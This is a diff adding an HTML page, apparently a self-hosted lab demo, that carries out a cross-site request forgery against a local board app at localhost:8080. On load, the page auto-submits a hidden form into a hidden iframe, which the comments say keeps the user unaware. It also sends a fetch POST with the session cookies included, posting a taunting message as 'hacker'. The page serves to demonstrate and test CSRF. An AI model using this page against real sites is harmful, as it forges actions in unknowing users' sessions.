@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Test</title>
+</head>
+<body>
+<h1>외부 CSRF 공격 테스트</h1>
+<p>별도 서비스애서 기동 필요</p>
+<p>이 페이지를 열면 자동으로 게시글이 등록됩니다.</p>
+<div id="status"></div>
+
+<!-- 방법 1: Form & iframe 활용 -->
+<form id="csrfForm" action="http://localhost:8080/board/new" method="POST" target="hiddenFrame">
+  <input type="hidden" name="title" value="Form CSRF ATTACK">
+  <input type="hidden" name="writer" value="hacker">
+  <input type="hidden" name="content" value="게시판 중학생한테 털렸죠 ㅋㅋㅋㅋㅋ">
+</form>
+
+<!-- iframe 추가 - 폼 제출 결과 여기로 이동 (사용자가 공격 사실 모르도록) -->
+<iframe name="hiddenFrame" style="display:none;"></iframe>
+
+<script>
+  // 노출되지 않은 form에서 진행된 요청 전송
+  document.getElementById('csrfForm').submit();
+
+  <!-- 방법 2: ajax를 활용한 CSRF 공격 -->
+  <!-- 요청 시 credentials: 'include' 옵션을 추가하여 쿠키(세션) 포함 -->
+  function sendCSRF() {
+    var formData = new FormData();
+    formData.append('title', 'JS CSRF ATTACK');
+    formData.append('writer', 'hacker');
+    formData.append('content', '게시판 중학생한테 털렸죠 ㅋㅋㅋㅋㅋ');
+
+    fetch('http://localhost:8080/board/new', {
+      method: 'POST',
+      body: formData,
+      credentials: 'include',  // 쿠키(세션) 포함
+    }).then((result) => {
+      document.getElementById('status').innerHTML = '<p style="color: green;">AJAX 요청 전송 완료</p>';
+    });
+  }
+
+  sendCSRF();
+</script>
+</body>
+</html>
